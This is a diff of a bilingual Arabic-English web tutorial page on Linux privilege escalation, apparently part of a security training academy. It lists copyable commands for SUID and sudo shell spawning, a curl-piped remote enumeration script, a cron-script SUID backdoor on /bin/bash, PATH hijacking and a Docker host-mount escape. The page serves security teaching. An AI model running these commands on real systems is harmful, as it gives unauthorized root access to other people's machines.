@@ -1,102 +1,206 @@
 {% extends "main/academy/base.html" %}
 
-{% block title %}Linux Privilege Escalation{% endblock %}
+{% block title %}Linux Privilege Escalation - Level 2{% endblock %}
 
 {% block content %}
 <div class="page-hero">
-  <h1 class="page-title">ترقية الصلاحيات في نظام لينكس (PrivEsc)</h1>
-  <p class="page-title-en">Linux Privilege Escalation Track</p>
+  <h1 class="page-title">Linux Security Privilege Escalation - Level 2</h1>
+  <p class="page-title-en">Linux Privilege Escalation — Level 2 Track</p>
   <span class="severity-pill pill-critical">TRACK 2</span>
-  <span class="severity-pill pill-high">⏱ ~30 min</span>
+  <span class="severity-pill pill-high">⏱ ~40 min</span>
 </div>
 
 <div class="section-card">
-  <h2>1. What is Privilege Escalation? / ما هي ترقية الصلاحيات؟</h2>
+  <h2>📖 What is it? / ما هو؟</h2>
   <div class="bilingual-block">
     <div class="lang-section">
       <span class="lang-tag">AR</span>
-      <p>ترقية الصلاحيات هي عملية استغلال ثغرة أمنية أو تكوين خاطئ (Misconfiguration) في نظام التشغيل للوصول إلى مستوى صلاحيات أعلى من المخصص للحساب الحالي (غالباً الانتقال من مستخدم عادي مثل <code>www-data</code> إلى مسؤول النظام <code>root</code>).</p>
+      <p>ترقية الصلاحيات المحلية (Local Privilege Escalation) هي عملية استغلال ثغرة أمنية أو خطأ إداري في تكوين النظام للحصول على صلاحيات المسؤول (root) انطلاقاً من حساب مستخدم محدود الصلاحية.</p>
     </div>
     <div class="lang-section lang-en">
       <span class="lang-tag">EN</span>
-      <p>Privilege escalation is the process of exploiting bugs or misconfigurations within an operating system to gain elevated access to resources that are normally protected from standard accounts (usually moving from a low-priv privilege like <code>www-data</code> to <code>root</code>).</p>
+      <p>Local Privilege Escalation (LPE) is the practice of exploiting security flaws or misconfigurations on a system to elevate permissions from a low-privileged account to root status.</p>
     </div>
-  </div>
-</div>
-
-<div class="section-card">
-  <h2>2. SUID/SGID Exploits / استغلال صلاحية SUID</h2>
-  <div class="bilingual-block">
-    <div class="lang-section">
-      <span class="lang-tag">AR</span>
-      <p>عند تعيين بت SUID على ملف تنفيذي، يتم تشغيل هذا الملف بصلاحيات مالك الملف (غالباً root) بدلاً من المستخدم الذي قام بتشغيله. إذا كان هذا الملف يسمح بتنفيذ أوامر أو قراءة ملفات بطرق غير مباشرة، يمكن استخدامه لترقية الصلاحيات.</p>
-    </div>
-    <div class="lang-section lang-en">
-      <span class="lang-tag">EN</span>
-      <p>When the SUID bit is set on an executable, it runs with the privileges of the file owner (usually root) rather than the user invoking it. If the binary supports command execution or interactive shells, it can be exploited to spawn a root shell.</p>
-    </div>
-  </div>
-
-  <div class="cmd-block">
-    <div class="cmd-bar">
-      <span>Find all SUID binaries / البحث عن ملفات SUID</span>
-      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
-    </div>
-    <pre>find / -perm -4000 -type f 2>/dev/null</pre>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>3. Sudo Privileges & GTFOBins / صلاحيات Sudo و GTFOBins</h2>
+  <h2>🎯 Goal / الهدف</h2>
   <div class="bilingual-block">
     <div class="lang-section">
       <span class="lang-tag">AR</span>
-      <p>يسمح أمر <code>sudo</code> للمستخدمين بتشغيل تطبيقات بصلاحيات root. يفحص المخترقون الصلاحيات المسموح بتشغيلها دون كلمة مرور <code>(NOPASSWD)</code> ثم يستعينون بموقع <strong>GTFOBins</strong> لمعرفة كيفية استغلال هذه البرمجيات (مثل <code>awk</code>, <code>find</code>, <code>vim</code>, <code>bash</code>) للحصول على shell.</p>
+      <p>تعلم كيفية فحص بيئة نظام لينكس يدوياً وتلقائياً، وتحديد نوافذ الاختراق واستغلال الأخطاء الشائعة لامتلاك النظام بالكامل.</p>
     </div>
     <div class="lang-section lang-en">
       <span class="lang-tag">EN</span>
-      <p>The <code>sudo</code> utility lets users execute commands with root permissions. Security auditors check allowed commands without password prompt via <code>sudo -l</code>, and then reference resources like <strong>GTFOBins</strong> to exploit applications (e.g. <code>awk</code>, <code>find</code>, <code>vim</code>) to drop into a root terminal.</p>
+      <p>Mastering system audits via manual and automated tools, identifying vector classes, and exploiting common privilege escalation entry points.</p>
     </div>
-  </div>
-
-  <div class="cmd-block">
-    <div class="cmd-bar">
-      <span>List Sudo Privileges / عرض الصلاحيات المتاحة</span>
-      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
-    </div>
-    <pre>sudo -l</pre>
-  </div>
-
-  <div class="cmd-block">
-    <div class="cmd-bar">
-      <span>Example Awk Sudo Exploit / استغلال أداة Awk</span>
-      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
-    </div>
-    <pre>sudo awk 'BEGIN {system("/bin/sh")}'</pre>
   </div>
 </div>
 
 <div class="section-card">
-  <h2>4. Writable Cron Jobs / المهام المجدولة القابلة للكتابة</h2>
-  <div class="bilingual-block">
+  <h2>📚 Topics & Commands / المواضيع والأوامر</h2>
+
+  <!-- 1. Enumeration -->
+  <h3>1. Automated Enumeration / الفحص والاستطلاع التلقائي</h3>
+  <div class="bilingual-block" style="margin-bottom:12px;">
     <div class="lang-section">
       <span class="lang-tag">AR</span>
-      <p>الـ Cron Jobs هي سكربتات يتم تشغيلها دورياً (مثلاً كل دقيقة) بصلاحيات معينة. إذا كان السكربت الذي يقوم الـ Cron بتشغيله مملوكاً لـ root ولكنه قابل للكتابة (Writable) لمستخدم عادي، يمكننا تعديله لإضافة أوامر مثل منح صلاحية SUID للـ Bash أو إنشاء اتصال عكسي (Reverse Shell).</p>
+      <p>استخدم سكربتات التدقيق السريعة لتحديد الثغرات والأخطاء الشائعة تلقائياً:</p>
     </div>
     <div class="lang-section lang-en">
       <span class="lang-tag">EN</span>
-      <p>Cron Jobs are automated tasks executed periodically (e.g., every minute). If a cron script runs as root but is writable by low-privilege users, attackers can inject malicious payloads (like adding SUID to bash or establishing a reverse shell) to achieve root status.</p>
+      <p>Using automation scripts to sweep the environment for known exploit vectors and credential files:</p>
     </div>
   </div>
-
   <div class="cmd-block">
-    <div class="cmd-bar">
-      <span>Inject SUID backdoor into writable script / حقن باب خلفي في سكربت Cron</span>
-      <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    <pre># Run LinPEAS script (best privilege escalation sweep script)
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Run Linenum script
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh && chmod +x linenum.sh && ./linenum.sh
+
+# Run Linux Exploit Suggester to check for kernel vulnerabilities
+perl linux-exploit-suggester.pl</pre>
+  </div>
+
+  <!-- 2. SUID Binaries -->
+  <h3 style="margin-top:20px;">2. SUID Binaries / استغلال صلاحية SUID</h3>
+  <div class="bilingual-block" style="margin-bottom:12px;">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>ابحث عن الملفات ذات صلاحية SUID التي تعمل بصلاحيات root واستغلها عبر قاعدة بيانات <strong>GTFOBins</strong>:</p>
     </div>
-    <pre>echo "chmod u+s /bin/bash" >> /path/to/writable_script.sh</pre>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Identifying setuid (SUID) files running under root owner context and cross-referencing with <strong>GTFOBins</strong>:</p>
+    </div>
+  </div>
+  <div class="cmd-block">
+    <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    <pre># Find all SUID files on the target filesystem
+find / -perm -4000 -type f 2>/dev/null
+
+# Example: if find has SUID bit, spawn root shell via find
+find . -exec /bin/sh -p \; -quit</pre>
+  </div>
+
+  <!-- 3. Cron Jobs -->
+  <h3 style="margin-top:20px;">3. Cron Jobs / المهام المجدولة</h3>
+  <div class="bilingual-block" style="margin-bottom:12px;">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>افحص ملفات المهام المجدولة بحثاً عن سكربتات تعمل كـ root وقابلة للكتابة والتعديل للمستخدم العادي:</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Auditing cron config schedules for root tasks executing user-writable scripts:</p>
+    </div>
+  </div>
+  <div class="cmd-block">
+    <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    <pre>cat /etc/crontab          # View system cron jobs scheduler
+ls -la /etc/cron.*         # List cron folders details
+# If a script in cron is writable:
+echo "chmod u+s /bin/bash" >> /path/to/writable_script.sh</pre>
+  </div>
+
+  <!-- 4. Sudo Rights -->
+  <h3 style="margin-top:20px;">4. Sudo Rights / صلاحيات Sudo المتاحة</h3>
+  <div class="bilingual-block" style="margin-bottom:12px;">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>تحقق من الأوامر التي يمكنك تشغيلها بصلاحية sudo دون إدخال كلمة المرور:</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Inspecting allowed root commands that can be invoked via sudo without password credentials:</p>
+    </div>
+  </div>
+  <div class="cmd-block">
+    <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    <pre>sudo -l                   # List allowed commands for current user
+# Example: if awk is allowed:
+sudo awk 'BEGIN {system("/bin/sh")}'</pre>
+  </div>
+
+  <!-- 5. Kernel Exploits -->
+  <h3 style="margin-top:20px;">5. Kernel Exploits / استغلال ثغرات النواة</h3>
+  <div class="cmd-block">
+    <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    <pre>uname -a                  # Identify Linux kernel version and architecture
+# On attack box:
+searchsploit linux kernel 4.4.0   # Search exploit database for kernel version</pre>
+  </div>
+
+  <!-- 6. Path Abuse -->
+  <h3 style="margin-top:20px;">6. Path Abuse / التلاعب بمتغير البيئة PATH</h3>
+  <div class="bilingual-block" style="margin-bottom:12px;">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>إذا كان سكربت SUID يستدعي أمراً بدون مسار مطلق (مثلاً <code>tar</code> بدلاً من <code>/bin/tar</code>)، يمكنك تعديل PATH:</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>If an SUID script executes system commands by relative paths instead of absolute ones, hijack the PATH environment variable:</p>
+    </div>
+  </div>
+  <div class="cmd-block">
+    <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    <pre>echo $PATH                # Display current environment path
+export PATH=/tmp:$PATH    # Prepend /tmp to PATH to run custom mock binary</pre>
+  </div>
+
+  <!-- 7. Capabilities -->
+  <h3 style="margin-top:20px;">7. File Capabilities / قدرات الملفات</h3>
+  <div class="bilingual-block" style="margin-bottom:12px;">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>تسمح الـ Capabilities بتقسيم صلاحيات root ومنح جزء منها لملف تنفيذي دون تعيين SUID:</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Linux capabilities partition root privileges into distinct privileges that can be set on specific executables:</p>
+    </div>
+  </div>
+  <div class="cmd-block">
+    <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    <pre>getcap -r / 2>/dev/null   # Search files with active capabilities</pre>
+  </div>
+
+  <!-- 8. Docker Escape -->
+  <h3 style="margin-top:20px;">8. Docker Escape / الهروب من حاويات دوجر</h3>
+  <div class="bilingual-block" style="margin-bottom:12px;">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>عند اختراق حاوية تعمل بامتيازات عالية، يمكن للمهاجم الهروب واستضافة السيرفر المضيف بربط مسار الجذر:</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>If you compromise a docker container with active root socket permissions or high privilege parameters, mount the host drive:</p>
+    </div>
+  </div>
+  <div class="cmd-block">
+    <button class="copy-btn" onclick="copyCmd(this)">Copy</button>
+    <pre>docker --version          # Verify docker service presence
+# Mount the root of host filesystem inside alpine container
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh</pre>
   </div>
 </div>
 
-<a class="academy-btn" href="linux-commands.html" style="display:inline-block;margin-top:8px;">الانتقال إلى جدول الأوامر المرجعي / Next: Commands Reference →</a>
+<div class="section-card">
+  <h2>✅ Next Steps / الخطوة القادمة</h2>
+  <div class="bilingual-block">
+    <div class="lang-section">
+      <span class="lang-tag">AR</span>
+      <p>الآن افتح المعمل التفاعلي لتجربة هجمات الاختراق وترقية الصلاحيات بشكل حي وعملي.</p>
+    </div>
+    <div class="lang-section lang-en">
+      <span class="lang-tag">EN</span>
+      <p>Open the interactive simulator labs to test privilege escalation attacks in a real-world CLI sandbox.</p>
+    </div>
+  </div>
+  <a class="academy-btn" href="linux-labs.html" style="display:inline-block;margin-top:10px;">🧪 Open Linux Security Labs (6 Levels) →</a>
+</div>
 {% endblock %}
